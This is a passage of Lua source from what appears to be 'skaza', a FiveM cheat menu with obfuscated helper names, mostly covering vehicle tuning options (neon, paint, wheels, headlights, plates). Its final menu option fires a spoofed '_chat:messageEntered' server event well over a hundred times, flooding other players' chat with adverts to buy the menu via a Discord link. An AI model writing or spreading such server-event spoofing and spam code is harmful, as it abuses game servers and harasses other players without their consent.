                if skaza.IsMenuOpened('tunings') then
                    if bg then
                        if bi == 'neon' then
                            local r, g, b = table.unpack(bh)
                            SetVehicleNeonLightsColour(veh, r, g, b)
                            SetVehicleNeonLightEnabled(veh, 0, bk)
                            SetVehicleNeonLightEnabled(veh, 1, bk)
                            SetVehicleNeonLightEnabled(veh, 2, bk)
                            SetVehicleNeonLightEnabled(veh, 3, bk)
                            bg = false
                            bi = -1
                            bh = -1
                        elseif bi == 'paint' then
                            local dF, dG, dH, dI = table.unpack(bh)
                            SetVehicleColours(veh, dF, dG)
                            SetVehicleExtraColours(veh, dH, dI)
                            bg = false
                            bi = -1
                            bh = -1
                        else
                            if bk == 'rm' then
                                RemoveVehicleMod(veh, bi)
                                bg = false
                                bi = -1
                                bh = -1
                            else
                                SetVehicleMod(veh, bi, bh, false)
                                bg = false
                                bi = -1
                                bh = -1
                            end
                        end
                    end
                end
                if skaza.IsMenuOpened(dE.id) then
                    if dE.id == 'wheeltypes' then
                        if piesaries('Sport Wheels') then
                            SetVehicleWheelType(veh, 0)
                        elseif piesaries('Muscle Wheels') then
                            SetVehicleWheelType(veh, 1)
                        elseif piesaries('Lowrider Wheels') then
                            SetVehicleWheelType(veh, 2)
                        elseif piesaries('SUV Wheels') then
                            SetVehicleWheelType(veh, 3)
                        elseif piesaries('Offroad Wheels') then
                            SetVehicleWheelType(veh, 4)
                        elseif piesaries('Tuner Wheels') then
                            SetVehicleWheelType(veh, 5)
                        elseif piesaries('High End Wheels') then
                            SetVehicleWheelType(veh, 7)
                        end
                        skaza.Display()
                    elseif dE.id == 'extra' then
                        local dJ = checkValidVehicleExtras()
                        for i, dE in pairs(dJ) do
                            if IsVehicleExtraTurnedOn(veh, i) then
                                pricestring = 'Zainstalowane'
                            else
                                pricestring = 'Not Installed'
                            end
                            if piesaries(dE.menuName, pricestring) then
                                SetVehicleExtra(veh, i, IsVehicleExtraTurnedOn(veh, i))
                            end
                        end
                        skaza.Display()
                    elseif dE.id == 'headlight' then
                        if piesaries('None') then
                            SetVehicleHeadlightsColour(veh, -1)
                        end
                        for dK, dE in pairs(bo) do
                            tp = GetVehicleHeadlightsColour(veh)
                            if tp == dE.id and not bg then
                                pricetext = 'Zainstalowane'
                            else
                                if bg and tp == dE.id then
                                    pricetext = 'Ogladanie'
                                else
                                    pricetext = 'Not Installed'
                                end
                            end
                            head = GetVehicleHeadlightsColour(veh)
                            if piesaries(dE.name, pricetext) then
                                if not bg then
                                    bi = 'headlight'
                                    bk = false
                                    oldhead = GetVehicleHeadlightsColour(veh)
                                    bh = table.pack(oldhead)
                                    SetVehicleHeadlightsColour(veh, dE.id)
                                    bg = true
                                elseif bg and head == dE.id then
                                    ToggleVehicleMod(veh, 22, true)
                                    SetVehicleHeadlightsColour(veh, dE.id)
                                    bg = false
                                    bi = -1
                                    bh = -1
                                elseif bg and head ~= dE.id then
                                    SetVehicleHeadlightsColour(veh, dE.id)
                                    bg = true
                                end
                            end
                        end
                        skaza.Display()
                    elseif dE.id == 'licence' then
                        if piesaries('None') then
                            SetVehicleNumberPlateTextIndex(veh, 3)
                        end
                        for dK, dE in pairs(bn) do
                            tp = GetVehicleNumberPlateTextIndex(veh)
                            if tp == dE.id and not bg then
                                pricetext = 'Zainstalowane'
                            else
                                if bg and tp == dE.id then
                                    pricetext = 'Ogladanie'
                                else
                                    pricetext = 'Not Installed'
                                end
                            end
                            plate = GetVehicleNumberPlateTextIndex(veh)
                            if piesaries(dE.name, pricetext) then
                                if not bg then
                                    bi = 'headlight'
                                    bk = false
                                    oldhead = GetVehicleNumberPlateTextIndex(veh)
                                    bh = table.pack(oldhead)
                                    SetVehicleNumberPlateTextIndex(veh, dE.id)
                                    bg = true
                                elseif bg and plate == dE.id then
                                    SetVehicleNumberPlateTextIndex(veh, dE.id)
                                    bg = false
                                    bi = -1
                                    bh = -1
                                elseif bg and plate ~= dE.id then
                                    SetVehicleNumberPlateTextIndex(veh, dE.id)
                                    bg = true
                                end
                            end
                        end
                        skaza.Display()
                    elseif dE.id == 'neon' then
                        if piesaries('None') then
                            SetVehicleNeonLightsColour(veh, 255, 255, 255)
                            SetVehicleNeonLightEnabled(veh, 0, false)
                            SetVehicleNeonLightEnabled(veh, 1, false)
                            SetVehicleNeonLightEnabled(veh, 2, false)
                            SetVehicleNeonLightEnabled(veh, 3, false)
                        end
                        for i, dE in pairs(bq) do
                            colorr, colorg, colorb = table.unpack(dE)
                            r, g, b = GetVehicleNeonLightsColour(veh)
                            if
                                colorr == r and colorg == g and colorb == b and IsVehicleNeonLightEnabled(vehicle, 2) and
                                    not bg
                             then
                                pricestring = 'Zainstalowane'
                            else
                                if bg and colorr == r and colorg == g and colorb == b then
                                    pricestring = 'Ogladanie'
                                else
                                    pricestring = 'Not Installed'
                                end
                            end
                            if piesaries(i, pricestring) then
                                if not bg then
                                    bi = 'neon'
                                    bk = IsVehicleNeonLightEnabled(veh, 1)
                                    oldr, oldg, oldb = GetVehicleNeonLightsColour(veh)
                                    bh = table.pack(oldr, oldg, oldb)
                                    SetVehicleNeonLightsColour(veh, colorr, colorg, colorb)
                                    SetVehicleNeonLightEnabled(veh, 0, true)
                                    SetVehicleNeonLightEnabled(veh, 1, true)
                                    SetVehicleNeonLightEnabled(veh, 2, true)
                                    SetVehicleNeonLightEnabled(veh, 3, true)
                                    bg = true
                                elseif bg and colorr == r and colorg == g and colorb == b then
                                    SetVehicleNeonLightsColour(veh, colorr, colorg, colorb)
                                    SetVehicleNeonLightEnabled(veh, 0, true)
                                    SetVehicleNeonLightEnabled(veh, 1, true)
                                    SetVehicleNeonLightEnabled(veh, 2, true)
                                    SetVehicleNeonLightEnabled(veh, 3, true)
                                    bg = false
                                    bi = -1
                                    bh = -1
                                elseif bg and colorr ~= r or colorg ~= g or colorb ~= b then
                                    SetVehicleNeonLightsColour(veh, colorr, colorg, colorb)
                                    SetVehicleNeonLightEnabled(veh, 0, true)
                                    SetVehicleNeonLightEnabled(veh, 1, true)
                                    SetVehicleNeonLightEnabled(veh, 2, true)
                                    SetVehicleNeonLightEnabled(veh, 3, true)
                                    bg = true
                                end
                            end
                        end
                        skaza.Display()
                    elseif dE.id == 'paint' then
                        if smiecaries('~h~~b~-»~w~ Primary Paint', 'primary') then
                        elseif smiecaries('~h~~b~-»~w~ Secondary Paint', 'secondary') then
                        elseif smiecaries('~h~~b~-»~w~ Wheel Paint', 'rimpaint') then
                        end
                        skaza.Display()
                    else
                        local az = checkValidVehicleMods(dE.id)
                        for i, dL in pairs(az) do
                            for dM, dN in pairs(bp) do
                                if dM == dE.name and GetVehicleMod(veh, dE.id) ~= dL.data.realIndex then
                                    price = 'Not Installed'
                                elseif dM == dE.name and bg and GetVehicleMod(veh, dE.id) == dL.data.realIndex then
                                    price = 'Ogladanie'
                                elseif dM == dE.name and GetVehicleMod(veh, dE.id) == dL.data.realIndex then
                                    price = 'Zainstalowane'
                                end
                            end
                            if dL.menuName == '~h~~w~Stock' then
                            end
                            if dE.name == 'Horns' then
                                for dO, dP in pairs(bp) do
                                    if dP == ci - 1 then
                                        dL.menuName = dO
                                    end
                                end
                            end
                            if dL.menuName == 'NULL' then
                                dL.menuName = 'unknown'
                            end
                            if piesaries(dL.menuName) then
                                if not bg then
                                    bi = dE.id
                                    bh = GetVehicleMod(veh, dE.id)
                                    bg = true
                                    if dL.data.realIndex == -1 then
                                        bk = 'rm'
                                        RemoveVehicleMod(veh, dL.data.modid)
                                        bg = false
                                        bi = -1
                                        bh = -1
                                        bk = false
                                    else
                                        bk = false
                                        SetVehicleMod(veh, dE.id, dL.data.realIndex, false)
                                    end
                                elseif bg and GetVehicleMod(veh, dE.id) == dL.data.realIndex then
                                    bg = false
                                    bi = -1
                                    bh = -1
                                    bk = false
                                    if dL.data.realIndex == -1 then
                                        RemoveVehicleMod(veh, dL.data.modid)
                                    else
                                        SetVehicleMod(veh, dE.id, dL.data.realIndex, false)
                                    end
                                elseif bg and GetVehicleMod(veh, dE.id) ~= dL.data.realIndex then
                                    if dL.data.realIndex == -1 then
                                        RemoveVehicleMod(veh, dL.data.modid)
                                        bg = false
                                        bi = -1
                                        bh = -1
                                        bk = false
                                    else
                                        SetVehicleMod(veh, dE.id, dL.data.realIndex, false)
                                        bg = true
                                    end
                                end
                            end
                        end
                        skaza.Display()
                    end
                end
            end
            for i, dE in pairs(bm) do
                if skaza.IsMenuOpened(dE.id) then
                    if GetVehicleMod(veh, dE.id) == 0 then
                        pricestock = 'Not Installed'
                        price1 = 'Zainstalowane'
                        price2 = 'Not Installed'
                        price3 = 'Not Installed'
                        price4 = 'Not Installed'
                    elseif GetVehicleMod(veh, dE.id) == 1 then
                        pricestock = 'Not Installed'
                        price1 = 'Not Installed'
                        price2 = 'Zainstalowane'
                        price3 = 'Not Installed'
                        price4 = 'Not Installed'
                    elseif GetVehicleMod(veh, dE.id) == 2 then
                        pricestock = 'Not Installed'
                        price1 = 'Not Installed'
                        price2 = 'Not Installed'
                        price3 = 'Zainstalowane'
                        price4 = 'Not Installed'
                    elseif GetVehicleMod(veh, dE.id) == 3 then
                        pricestock = 'Not Installed'
                        price1 = 'Not Installed'
                        price2 = 'Not Installed'
                        price3 = 'Not Installed'
                        price4 = 'Zainstalowane'
                    elseif GetVehicleMod(veh, dE.id) == -1 then
                        pricestock = 'Zainstalowane'
                        price1 = 'Not Installed'
                        price2 = 'Not Installed'
                        price3 = 'Not Installed'
                        price4 = 'Not Installed'
                    end
                    if piesaries('Stock ' .. dE.name, pricestock) then
                        SetVehicleMod(veh, dE.id, -1)
                    elseif piesaries(dE.name .. ' Upgrade 1', price1) then
                        SetVehicleMod(veh, dE.id, 0)
                    elseif piesaries(dE.name .. ' Upgrade 2', price2) then
                        SetVehicleMod(veh, dE.id, 1)
                    elseif piesaries(dE.name .. ' Upgrade 3', price3) then
                        SetVehicleMod(veh, dE.id, 2)
                    elseif dE.id ~= 13 and dE.id ~= 12 and piesaries(dE.name .. ' Upgrade 4', price4) then
                        SetVehicleMod(veh, dE.id, 3)
                    end
                    skaza.Display()
                end
            end
            if skaza.IsMenuOpened('\115\107\97\122\97\86\10') then
				
				
				if piesaries('Twoj nick: <FONT COLOR="#00f7ff">' .. GetPlayerName(PlayerId(-1)) .. '') then
				
           
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
								jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
								jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe')
				jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
